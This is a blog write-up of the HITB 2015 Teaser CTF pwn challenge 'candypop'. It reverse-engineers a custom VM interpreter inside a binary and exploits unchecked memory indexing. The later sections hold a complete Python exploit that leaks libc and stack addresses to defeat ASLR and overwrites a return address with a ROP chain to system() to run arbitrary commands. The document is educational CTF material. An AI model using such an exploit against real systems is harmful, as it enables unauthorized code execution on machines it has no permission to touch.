Title: bin1000 - candypop
Author: doskop
Date: 2015-03-29 17:34
Tags: CTF


## Introduction

This is a write-up of the pwn1000 challenge (candypop) of the HITB 2015 Teaser CTF. Here's the original description of the challenge:

> We got backdoor access to an old candy vending machine, however we havent
> been able to escalate privileges to the underlying operating system yet. The
> candy machine is said to be using a strange obscure and minimal architecture.
> Can you help us get access? We need to get ahold of the copious amounts of
> KitKat & Snickers A.S.A.P.

> We conveniently made the backdoor accessible over TCP/IP, it can be reached at
> 52.16.33.218:22226. Furthermore, we managed to bribe an old employee of the
> manufacturer (that is now defunct) of the vending machine to send us a copy of
> a binary.. but we can't make heads or tails out of it. HELP!

Download the binary: [candypop]({filename}/downloads/hitb-2015-teaser-ctf/candypop).

## Initial analysis

Let's see what we've got ("hello world" is my input):

    $ file candypop
    candypop: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
    
    $ readelf -l candypop | grep -A1 GNU_STACK
      GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                     0x0000000000000000 0x0000000000000000  RW     10
    
    $ telnet 52.16.33.218 22226
    Trying 52.16.33.218...
    Connected to ec2-52-16-33-218.eu-west-1.compute.amazonaws.com.
    Escape character is '^]'.
    Herro.
    INPUT PROGRAM:
    hello world
    READ 13 BYTEZ..
    Connection closed by foreign host.

So probably a virtual machine, interpreter or sandbox with a non-executable stack. We know nothing about what kind of program it accepts though.

Let's see if we can identify the remote system:

    $ strings candypop|grep GCC
    GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2

Google shows us this GCC version is used on Ubuntu Trusty Tahr. So fire up a VM that runs that, we'll continue from inside the VM.

## Disassembly

Let's have a look at the disassembly. The program is stripped, so have a look at the entrypoint to discover the address of the main function, it's 0x1235. Looking at that function you'll notice the following things:

- It sets up 0x4030 bytes of stack space.
- It outputs the banner.
- Reads up to 0x4000 bytes from stdin to rbp-0x4010 and stores how many bytes were read to rbp-0x4014.
- It outputs how many bytes were read.
- If it didn't read anything, it'll print an error.
- If it did read something, it calls 0x10f5 providing two arguments: the buffer and the program length.
- Either way it prints '** DONE' and returns.

The function at 0x10f5 prepares a buffer, initialises it and calls another function:

- It sets up 0x4030 bytes of stack space.
- It stores the pointer to the program at rbp-0x4028 and the length at rbp-0x402c.
- It calls a function at 0xac5 with rbp-0x4020 as argument.
- It copies the program from the provider buffer to rbp-0x4020.
- It calls a function at 0xb32 with rbp-0x4020 as only argument.

The function at 0xac5 initialises the provided buffer:

- It sets the first 9 shorts at offset 0x4000 to 0 (the first 7 in a loop, the last 2 explicitly).
- It sets the first 0x4000 to 0 using memset.

So the structure of this buffer is probably something like:

    :::c
    struct {
        char a[4000];
        short b[7];
        short c;
        short d;
    }

Now we get to the really interesting part. The function at 0xb32 seems to be the main interpreter:

- It stores the pointer to the buffer.a member to rbp-0x10.
- It stores the pointer to the buffer.b member to rbp-0x08.
- It loops while buffer.d > 0 increasing d by 1 and buffer.c by 4 each iteration.
- Each iteration loads the byte at buffer.a[buffer.c + 1] into rbp-0x18 and a short encoded in big endian at buffer.b[buffer.c + {2,3}] into rbp-0x14.
- It then performs a switch on buffer.b[buffer.c] and executes some instruction based on that.

Okay, so now we can say something about the interpreter. It's a virtual machine where each operation consists of an opcode, an 8 bit argument and a 16 bit argument. Buffer.c is the program counter, buffer.d keeps track of how many instruction have been executed. Looking at the disassembly of the actual opcodes, the buffer.b seems to be the memory of the virtual machine.

That buffer, is not just a buffer but describes the virtual machine state:

    :::c
    typedef struct {
        unsigned char opcode;
        unsigned char arg1;
        unsigned short arg2;  // not really a short as it's big endian.
    } opcode;
    
    struct {
        opcode opcodes[1000];
        short mem[7];
        short pc;  // program counter
        short ic;  // executed instructions counter
    }

After closer analysis, the individual opcodes map out like this:

    opcode | function
    -------|------------------------------
    0x10   | mem[arg1] = arg2
    0x11   | mem[arg1] = mem[arg2]
    0x12   | mem[arg1] ^= arg2
    0x30   | mem[arg1] <<= arg2
    0x31   | mem[arg1] >>= arg2
    0x40   | mem[arg1] += arg2
    0x41   | mem[arg1] += mem[arg2]
    0x49   | mem[arg1] |= arg2
    0x50   | mem[arg1] &= arg2
    0x51   | mem[arg1] &= & mem[arg2]
    0x60   | flag = mem[arg1] == arg2
    0x61   | flag = mem[arg1] == mem[arg2]
    0xa5   | printf("%04x\n", mem[arg1])
    0xa6   | putchar(0x0a)
    0xbb   | if(flag == 1) jump arg2
    0xbc   | jump arg2
    0xc0   | exit(-1)
    0xde   | return 0
    0xfe   | read(program + 0x3f00, 0x100)

Now, with all functionality mapped, what can we do to break it?

## Exploitation

When accessing the memory, arg1 and arg2 aren't bounds checked so let's see if we can see anything interesting from the stack. We create a program for the interpreter that leaks everything from mem[10] to mem[255] and then calls the 0xfe opcode (which we can easily catch in gdb by catching the read syscall).

    #!/usr/bin/env python
    from pwny import *
    with open('candyflood', 'wb') as f:
      f.write(b''.join(pack('<BBH', 0xa5, i, 0) for i in range(10,256)))
      f.write(pack('<BBH', 0xc0,0,0))

Feeding that to the remote service using netcat (nc 52.16.33.218 22226 < candyflood) shows something along the lines of:

    Herro.
    INPUT PROGRAM:
    READ 92 BYTEZ..
    7fff
    0000
    2f52
    f7a8
    7fff
    0000
    e440
    ffff
    7fff
    0000
    52fa
    5555
    5555
    0000
    e528
    ffff
    7fff
    0000
    0000
    0000
    0001
    0000
    ...

This example is actually the output from a gdb session and not the remote server, but that doesn't really matter. The lines 4 and 5 are part of an address but the address is incomplete, lines 6-9, 10-13 and 14-17 make up addresses. If you run it a second time, you'll notice the addresses have changed. ASLR is enabled.

Let's run it in gdb and see what we find. We catch syscall read before we run the program and keep continuing until we're returned to gdb after the memory has been dumped.

Use info proc mappings to discover which section holds the first address (0x00007ffff7a82f52). It's in libc.so, at an offset of 0x6df52 from the beginning of the mapped region. We can use this to calculate the address of the system() function.

The second address (0x00007fffffffe440) is a stack address, it's actually the stored frame pointer of the main function. Since we caught the read syscall, we have the address of the secondary read buffer (buffer.opcodes + 0x3f00) in the rsi register. The offset between the leaked address and the read buffer is 0x4160 bytes.

The third address (0x00005555555552fa) is the return address for the function at 0x10f5 and points to inside the main function.

Now we have everything we need to craft a solution: a way to leak a pointer to the stack and to libc, an overwritable return pointer and a way to run a second program which can exploit those conditions after leaking the addresses.

## Solution

After collecting all the data, I used pwnypack to write a script that leaks the libc and stack address, calculates the base addresses of libc and the second phase read buffer. It then locates a pop rdi; ret gadget inside libc, looks up the address of the system() call and sets up the ROP chain for a command provided on the commandline.

    #!/usr/bin/env python
    
    from __future__ import print_function
    import sys
    import os
    from pwny import *
    
    
    if len(sys.argv) < 2:
        print('usage: %s <command></command> [arg...]' % sys.argv[0], file=sys.stderr)
        sys.exit(1)
    
    
    # Function to get the full path to a local file.
    local_file = lambda f: os.path.join(os.path.dirname(sys.argv[0]), f)
    
    # Assume the target of the candypop binary.
    target.assume(ELF(local_file('candypop')))
    
    # Load libc.so from ubuntu trusty tahr. Note: the libc.so version was deduced
    # from the gcc signature in the candypop binary.
    libc = ELF(local_file('candypop-libc.so'))
    
    # Function to pack a series of candypop VM commands.
    build = lambda c: pack('>' + 'BBH' * (len(c) // 3), *c)
    
    # Parse a sequence of address parts to an address.
    parse_addr = lambda c: int(b''.join(c), 16)
    
    
    # Connect to the candy machine.
    #f = Flow.connect_tcp('52.16.33.218', 22226)
    # If you want to use the local executable, use:
    f = Flow.execute('./candypop')
    
    # Consume initial output.
    f.until(b'INPUT PROGRAM:\n')
    
    # Phase 1, leak addresses, initiate read.
    f.write(build([
        # Write something to get required addresses on stack.
        0xa5, 0, 0,
    
        # Leak address inside libc.
        0xa5, 15, 0,
        0xa5, 14, 0,
        0xa5, 13, 0,
        0xa5, 12, 0,
    
        # Leak stack address.
        0xa5, 19, 0,
        0xa5, 18, 0,
        0xa5, 17, 0,
        0xa5, 16, 0,
    
        # Tell candy machine to read more data.
        0xfe, 0,  0,
    ]), echo=False)
    # Consume uninteresting output.
    f.until(b'0000\n')
    
    # Get the interesting bits.
    data = [l.strip() for l in f.readlines(8)]
    
    # Parse output and calculate relevant addresses.
    libc_base = parse_addr(data[0:4]) - 0x6df52
    read_buffer = parse_addr(data[4:9]) - 0x4160
    system_addr = libc_base + libc.get_symbol('system')['value']
    system_arg = read_buffer + 52  # 52 = length of secondary program: 13 ops * 4 bytes.
    # Assemble the gadget we want and find it.
    gadget = asm('pop rdi\nret')
    gadget_addr = libc_base + find_gadget(libc, gadget)[0]['addr']
    
    # Concatenate command line arguments.
    system_cmd = ' '.join(sys.argv[1:]).encode('latin1')
    
    # Secondary program sets up the stack to return to the gadget and
    # then returns to the system() libc function.
    f.write(build([
        # Write address of gadget (pop rdi; ret) to RP.
        0x10, 23, (gadget_addr >> 48) & 0xffff,
        0x10, 22, (gadget_addr >> 32) & 0xffff,
        0x10, 21, (gadget_addr >> 16) & 0xffff,
        0x10, 20, (gadget_addr >>  0) & 0xffff,
    
        # Write address of argument to system to RP+8.
        0x10, 27, (system_arg >> 48) & 0xffff,
        0x10, 26, (system_arg >> 32) & 0xffff,
        0x10, 25, (system_arg >> 16) & 0xffff,
        0x10, 24, (system_arg >>  0) & 0xffff,
    
        # Write address of system() to RP+16.
        0x10, 31, (system_addr >> 48) & 0xffff,
        0x10, 30, (system_addr >> 32) & 0xffff,
        0x10, 29, (system_addr >> 16) & 0xffff,
        0x10, 28, (system_addr >>  0) & 0xffff,
    
        # Return.
        0xde, 0, 0,
    ]) + system_cmd, echo=False)
    
    f.read_eof(echo=True)
    
We can then execute commands on the remote machine:
    
    $ ./candypwn.py ls
    candypop
    YOU_WANT_THIS
    $ ./candypwn.py cat YOU_WANT_THIS
    HITB{8b7b9241c9282e9a982378f73d648781}

And there we have it, the flag.
